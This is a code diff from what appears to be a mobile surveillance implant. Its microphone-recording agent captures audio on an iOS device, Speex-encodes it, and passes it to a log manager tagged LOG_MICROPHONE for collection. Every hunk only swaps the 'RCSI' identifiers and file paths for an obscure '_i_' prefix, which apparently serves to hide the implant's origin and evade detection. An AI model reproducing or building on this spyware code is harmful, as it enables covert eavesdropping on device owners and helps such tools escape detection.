@@ -28,7 +28,7 @@ static NSLock *micLock;
 
 // Determine the size, in bytes, of a buffer necessary to represent the supplied number
 // of seconds of audio data.
-int RCSIMicrophoneRecorder::ComputeRecordBufferSize(const AudioStreamBasicDescription *format, float seconds)
+int _i_MicrophoneRecorder::ComputeRecordBufferSize(const AudioStreamBasicDescription *format, float seconds)
 {
 	int packets, frames, bytes = 0;
 	try {
@@ -63,7 +63,7 @@ int RCSIMicrophoneRecorder::ComputeRecordBufferSize(const AudioStreamBasicDescri
 	return bytes;
 }
 
-BOOL RCSIMicrophoneRecorder::speexEncodeBuffer(void *input,
+BOOL _i_MicrophoneRecorder::speexEncodeBuffer(void *input,
                                                u_int audioChunkSize,
                                                u_int channels,
                                                int fileCounter)
@@ -92,7 +92,7 @@ BOOL RCSIMicrophoneRecorder::speexEncodeBuffer(void *input,
   u_int complexity      = 1;
   u_int quality         = 5;
   
-  RCSILogManager *_logManager = [RCSILogManager sharedInstance];
+  _i_LogManager *_logManager = [_i_LogManager sharedInstance];
   
   // Create a new wide mode encoder
   speexState = speex_encoder_init(speex_lib_get_mode(SPEEX_MODEID_UWB));
@@ -268,7 +268,7 @@ BOOL RCSIMicrophoneRecorder::speexEncodeBuffer(void *input,
   time_t ut;
   time(&ut);
   
-  NSString *outFile = [[NSString alloc] initWithFormat: @"/private/var/mobile/RCSIphone/speexEncoded-%d.wav", ut];
+  NSString *outFile = [[NSString alloc] initWithFormat: @"/private/var/mobile/_i_phone/speexEncoded-%d.wav", ut];
   
   [fileData writeToFile: outFile
              atomically: YES];
@@ -291,7 +291,7 @@ BOOL RCSIMicrophoneRecorder::speexEncodeBuffer(void *input,
   return TRUE;
 }
 
-void RCSIMicrophoneRecorder::createLogForBufferedAudio (int fileNumber)
+void _i_MicrophoneRecorder::createLogForBufferedAudio (int fileNumber)
 {
 #ifdef DEBUG
   NSLog(@"createLogForBufferedAudio - fileNumber (%d)", fileNumber);
@@ -344,7 +344,7 @@ void RCSIMicrophoneRecorder::createLogForBufferedAudio (int fileNumber)
   agentAdditionalHeader->hiTimestamp = mHiTimestamp;
   agentAdditionalHeader->loTimestamp = mLoTimestamp;
   
-  RCSILogManager *logManager = [RCSILogManager sharedInstance];
+  _i_LogManager *logManager = [_i_LogManager sharedInstance];
   
   BOOL success = [logManager createLog: LOG_MICROPHONE
                            agentHeader: rawAdditionalHeader
@@ -406,7 +406,7 @@ void RCSIMicrophoneRecorder::createLogForBufferedAudio (int fileNumber)
       // Append audio chunk
       [audioData appendData: _audioBuffer];
       
-      //[audioData writeToFile: @"/private/var/mobile/RCSIphone/temp.wav" atomically: YES];
+      //[audioData writeToFile: @"/private/var/mobile/_i_phone/temp.wav" atomically: YES];
       
       if ([logManager writeDataToLog: audioData
                             forAgent: LOG_MICROPHONE + fileNumber] == TRUE)
@@ -428,14 +428,14 @@ void RCSIMicrophoneRecorder::createLogForBufferedAudio (int fileNumber)
 //
 // AudioQueue callback function, called when an input buffers has been filled
 //
-void RCSIMicrophoneRecorder::MyInputBufferHandler(void                                *inUserData,
+void _i_MicrophoneRecorder::MyInputBufferHandler(void                                *inUserData,
                                                   AudioQueueRef                       inAQ,
                                                   AudioQueueBufferRef                 inBuffer,
                                                   const AudioTimeStamp                *inStartTime,
                                                   UInt32                              inNumPackets,
                                                   const AudioStreamPacketDescription  *inPacketDesc)
 {
-	RCSIMicrophoneRecorder *aqr = (RCSIMicrophoneRecorder *)inUserData;
+	_i_MicrophoneRecorder *aqr = (_i_MicrophoneRecorder *)inUserData;
   
 	try {
 		if (inNumPackets > 0) {
@@ -462,7 +462,7 @@ void RCSIMicrophoneRecorder::MyInputBufferHandler(void                          
 	}
 }
 
-RCSIMicrophoneRecorder::RCSIMicrophoneRecorder()
+_i_MicrophoneRecorder::_i_MicrophoneRecorder()
 {
 	mIsRunning    = false;
 	mRecordPacket = 0;
@@ -473,7 +473,7 @@ RCSIMicrophoneRecorder::RCSIMicrophoneRecorder()
   micLock = [NSLock new];
 }
 
-RCSIMicrophoneRecorder::~RCSIMicrophoneRecorder()
+_i_MicrophoneRecorder::~_i_MicrophoneRecorder()
 {
 	AudioQueueDispose(mQueue, TRUE);
 	AudioFileClose(mRecordFile);
@@ -484,7 +484,7 @@ RCSIMicrophoneRecorder::~RCSIMicrophoneRecorder()
 }
 
 // Copy a queue's encoder's magic cookie to an audio file.
-void RCSIMicrophoneRecorder::CopyEncoderCookieToFile()
+void _i_MicrophoneRecorder::CopyEncoderCookieToFile()
 {
 	UInt32 propertySize;
 	// get the magic cookie, if any, from the converter		
@@ -516,7 +516,7 @@ void RCSIMicrophoneRecorder::CopyEncoderCookieToFile()
     }
 }
 
-void RCSIMicrophoneRecorder::SetupAudioFormat(UInt32 inFormatID)
+void _i_MicrophoneRecorder::SetupAudioFormat(UInt32 inFormatID)
 {
   memset(&mRecordFormat, 0, sizeof(mRecordFormat));
   
@@ -542,7 +542,7 @@ void RCSIMicrophoneRecorder::SetupAudioFormat(UInt32 inFormatID)
     }
 }
 
-void RCSIMicrophoneRecorder::StartRecord()
+void _i_MicrophoneRecorder::StartRecord()
 {
 	int i, bufferByteSize;
 	UInt32 size;
@@ -605,10 +605,10 @@ void RCSIMicrophoneRecorder::StartRecord()
   
 }
 
-void RCSIMicrophoneRecorder::StopRecord()
+void _i_MicrophoneRecorder::StopRecord()
 {
 #ifdef DEBUG
-  NSLog(@"RCSIMicrophoneRecorder::StopRecord called");
+  NSLog(@"_i_MicrophoneRecorder::StopRecord called");
 #endif
   
 	// end recording
